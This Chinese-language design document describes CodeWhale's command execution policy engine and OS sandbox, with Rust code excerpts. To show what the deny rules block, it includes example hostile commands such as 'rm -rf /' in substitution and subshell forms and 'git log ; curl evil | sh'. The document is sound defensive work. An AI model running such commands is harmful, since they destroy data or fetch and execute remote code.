---
type: Concept
title: "沙箱与执行策略"
description: "execpolicy crate 提供三层规则集、三种权限动作和五种审批模式，配合 macOS Seatbelt 与 Linux Bubblewrap OS 沙箱，通过 shell 词法展开检测防止命令绕过。"
tags: [codewhale, sandbox, execpolicy, security, seatbelt, bwrap, shell, approval]
generated: { by: "reference_agent/trae-cn", at: 2026-08-23T10:00:00+08:00 }
verified: { by: "process:grep-verification", at: 2026-08-23T10:00:00+08:00 }
status: stable
stale_after: 2027-08-23
sources:
  - id: src
    resource: /references/source.md
    title: 源码信源
---

# 沙箱与执行策略

CodeWhale 的安全模型由两层组成：`codewhale-execpolicy` crate 负责命令安全评估和审批决策，TUI 的 `sandbox` 模块负责 OS 级沙箱执行。两者协同工作，在工具调用到达 shell 之前进行多层拦截。

## RulesetLayer：三层优先级

执行策略使用三层优先级规则集，高层覆盖低层：

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RulesetLayer {
    BuiltinDefault = 0,
    Agent = 1,
    User = 2,
}
```

- **BuiltinDefault(0)**：内置默认规则，最低优先级
- **Agent(1)**：Agent 层规则，来自 agent 配置
- **User(2)**：用户层规则，最高优先级，来自用户的 `permissions.toml`

每个规则集包含 trusted prefixes、denied prefixes 和 typed ask rules：

```rust
pub struct Ruleset {
    pub layer: RulesetLayer,
    pub trusted_prefixes: Vec<String>,
    pub denied_prefixes: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ask_rules: Vec<ToolAskRule>,
}
```

规则集在构造时按 layer 优先级排序。Hard denied prefixes 跨层合并并首先检查。

## PermissionAction：三种权限动作

```rust
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum PermissionAction {
    Allow,
    Ask,
    Deny,
}
```

同一 ruleset 内的优先级：**deny 胜过 ask 胜过 allow**。高层规则在动作和特异性之前已被选中。

`ToolAskRule` 是类型化的规则，可以匹配工具名、命令前缀、文件路径和工作区：

```rust
#[serde(deny_unknown_fields)]
pub struct ToolAskRule {
    pub tool: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub command_exact: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace: Option<String>,
    #[serde(default = "default_rule_action")]
    pub action: PermissionAction,
}
```

`command_exact` 标志使审批卡片记住的授权不会静默授权带额外参数的后续调用。

## AskForApproval：五种审批模式

```rust
#[serde(rename_all = "snake_case")]
pub enum AskForApproval {
    UnlessTrusted,
    OnFailure,
    OnRequest,
    Reject {
        sandbox_approval: bool,
        rules: bool,
        mcp_elicitations: bool,
    },
    Never,
}
```

- **UnlessTrusted**：命令匹配 trusted prefix 时跳过审批，否则需要审批
- **OnFailure**：允许执行，仅在失败后请求审批
- **OnRequest**：始终在执行前需要审批
- **Reject**：根据特定标准直接拒绝调用（沙箱审批、规则例外、MCP elicitation）
- **Never**：永不要求审批；禁止需要审批的命令

## ExecPolicyEngine

策略引擎评估命令并返回决策：

```rust
#[derive(Debug, Clone, Default)]
pub struct ExecPolicyEngine {
    rulesets: Vec<Ruleset>,
    trusted_prefixes: Vec<String>,
    denied_prefixes: Vec<String>,
    approved_for_session: HashSet<String>,
    arity_dict: BashArityDict,
}
```

### 评估流程

`check` 方法的评估顺序为：

1. **Hard denied prefixes**（跨层合并，首先检查）
2. **Trusted-prefix candidate**（单段命令，arity-aware 匹配）
3. **Winning typed rule**（按 layer、action、specificity 选择）
4. **Approval-mode fallback**

```rust
pub fn check(&self, ctx: ExecPolicyContext<'_>) -> Result<ExecPolicyDecision> {
    let (trusted_prefixes, denied_prefixes) = self.resolve_prefixes();
    let deny_targets = deny_scan_targets(ctx.command);
    if let Some(rule) = denied_prefixes.iter().find(|rule| {
        deny_targets.iter().any(|hay| denied_prefix_matches(rule, hay))
    }) {
        return Ok(ExecPolicyDecision {
            allow: false,
            requires_approval: false,
            // ... Forbidden
        });
    }
    // ... trusted prefix, typed rules, mode fallback
}
```

### 决策结果

```rust
pub enum ExecApprovalRequirement {
    Skip {
        bypass_sandbox: bool,
        proposed_execpolicy_amendment: Option<ExecPolicyAmendment>,
    },
    NeedsApproval {
        reason: String,
        proposed_execpolicy_amendment: Option<ExecPolicyAmendment>,
        proposed_network_policy_amendments: Vec<NetworkPolicyAmendment>,
    },
    Forbidden {
        reason: String,
    },
}
```

### 词边界匹配

Deny 规则在词边界匹配位置 token：`rm` 阻止 `rm -rf /` 但**不阻止** `rmdir` 或 `rmview`。匹配同时是 flag-aware 的：`git -c foo=bar push` 仍被 `git push` 规则匹配，因为全局 flag 插入在子命令之前不会击败规则。

### 链式命令防护

链式命令（`&&`、`||`、`;`、`|`、`&`）不会被 trusted prefix 自动批准。`git log ; rm -rf /` 不会因为 `git log` 受信任而通过：

```rust
let trusted_rule = if command_is_chained(ctx.command) {
    None
} else {
    trusted_prefixes.iter()
        .find(|rule| self.arity_dict.allow_rule_matches(rule, ctx.command))
        .cloned()
};
```

typed Allow 规则也有相同的单段限制——`allow "git log"` 不会放行 `git log ; curl evil | sh`。

## Shell 词法展开检测

`shell_expand` 模块是 deny 规则的核心防线。Deny 规则是在 `AskForApproval::Never` 下唯一持有 的门控，因此不能仅匹配原始命令字符串——用户输入的字符串和 shell 实际执行的命令集是不同的。

`expanded_commands` 函数返回 shell 将为给定命令执行的**每一条**命令行：

```rust
pub fn expanded_commands(command: &str) -> Vec<String> {
    let mut expander = Expander {
        out: Vec::new(),
        seen: HashSet::new(),
    };
    let trimmed = command.trim();
    if !trimmed.is_empty() {
        expander.seen.insert(trimmed.to_string());
        expander.out.push(trimmed.to_string());
    }
    expander.expand(command, 0);
    expander.out
}
```

它能检测：
- **命令替换**：`` `rm -rf /` ``、`$(rm -rf /)`
- **子 shell**：`(rm -rf /)`
- **Wrapper 载荷**：`bash -c '…'`、`eval '…'`、`sudo …`
- **引号去除**：`rm -rf "/"` 仍被匹配
- **链式段**：`&&`、`||`、`;`、`|`

Passthrough wrappers 列表（前缀剥离后匹配真实命令）：

```rust
const PASSTHROUGH_WRAPPERS: &[&str] = &[
    "sudo", "doas", "env", "nohup", "nice", "ionice", "time", "timeout",
    "stdbuf", "setsid", "command", "builtin", "exec", "xargs", "unbuffer",
    "busybox", "chroot", "proot",
];
```

Shell 名称列表（`-c` 参数是命令行而非操作数）：

```rust
const SHELL_NAMES: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "ksh93", "mksh", "ash",
    "fish", "csh", "tcsh", "rbash", "yash",
];
```

设计原则是**在 deny 方向上保守**：构造有歧义时发出额外候选命令行而非更少。过度发出只会使 deny 匹配更严格（`denied_prefix_matches` 锚定在第一个位置 token），不足发出则是绕过。模块不评估任何内容：`$VAR` 保持字面文本，单引号文本从不被视为代码。

安全限制：
- `MAX_DEPTH = 8`：替换和 `-c` 载荷的最大嵌套深度
- `MAX_COMMANDS = 256`：发出命令行的上限
- `MAX_HEAD_SCAN = 8`：wrapper 头部扫描深度

## OS 级沙箱

TUI 的 `sandbox` 模块提供平台特定的 OS 沙箱。

### 平台支持

| 平台 | 沙箱后端 | 状态 |
|------|----------|------|
| macOS | Seatbelt (`sandbox-exec`) | 运行时探测成功时可用 |
| Linux | Bubblewrap (`bwrap`) | 需 opt-in `prefer_bwrap = true`，需 `/usr/bin/bwrap` 可执行 |
| OpenHarmony | 无 | Bubblewrap、seccomp、prctl 均被 gate 掉 |
| Windows | 无 | 计划首个辅助契约仅为进程树包含（Job Object），不声明文件系统/网络/注册表隔离 |

公开的沙箱后端标签：

```rust
pub const PUBLIC_SANDBOX_BACKENDS: &[&str] = &[
    "seatbelt (macOS, when available)",
    "bubblewrap (Linux, opt-in when installed)",
];
```

### SandboxPolicy

沙箱策略控制文件系统、网络和系统资源访问：

```rust
#[serde(tag = "type", rename_all = "kebab-case")]
pub enum SandboxPolicy {
    #[serde(rename = "danger-full-access")]
    DangerFullAccess,

    #[serde(rename = "read-only")]
    ReadOnly,

    #[serde(rename = "external-sandbox")]
    ExternalSandbox {
        #[serde(default)]
        network_access: bool,
    },

    #[serde(rename = "workspace-write")]
    WorkspaceWrite {
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        writable_roots: Vec<PathBuf>,
        #[serde(default)]
        network_access: bool,
        #[serde(default)]
        exclude_tmpdir: bool,
        #[serde(default)]
        exclude_slash_tmp: bool,
    },
}
```

- **DangerFullAccess**：无任何限制，极度谨慎使用
- **ReadOnly**：整个文件系统只读，不能写入任何位置
- **ExternalSandbox**：进程已在外部沙箱（容器/VM）中运行，避免双重沙箱
- **WorkspaceWrite**（默认推荐）：只读整个文件系统，仅允许写入当前工作目录和指定 roots，可选网络访问

### CommandSpec

命令执行规范封装了沙箱化执行所需的全部信息：

```rust
pub struct CommandSpec {
    pub program: String,
    pub args: Vec<String>,
    pub cwd: PathBuf,
    pub env: HashMap<String, String>,
    pub timeout: Duration,
    pub sandbox_policy: SandboxPolicy,
    pub justification: Option<String>,
    pub requested_command: Option<String>,
}
```

## 会话审批记忆

`ExecPolicyEngine` 支持会话级审批记忆：

```rust
pub fn remember_session_approval(&mut self, approval_key: String) {
    self.approved_for_session.insert(approval_key);
}

pub fn is_session_approved(&self, approval_key: &str) -> bool {
    self.approved_for_session.contains(approval_key)
}
```

用户在审批卡片中选择"记住此授权"后，同会话内的后续匹配命令跳过审批。

## 相关概念

- [工具系统](/concepts/04-tool-system.md) — 工具调度中的 allow_mutating 守卫
- [Fleet 多 Agent](/concepts/05-fleet-subagents.md) — 权限 clamp 与 shell ceiling
- [Agent 核心运行时](/concepts/02-agent-core.md) — Runtime 中的 exec_policy 组件
- [MCP 协议集成](/concepts/03-mcp-protocol.md) — MCP 工具调用的权限控制
- [工作区架构](/concepts/01-workspace-architecture.md) — execpolicy crate 在分层中的位置
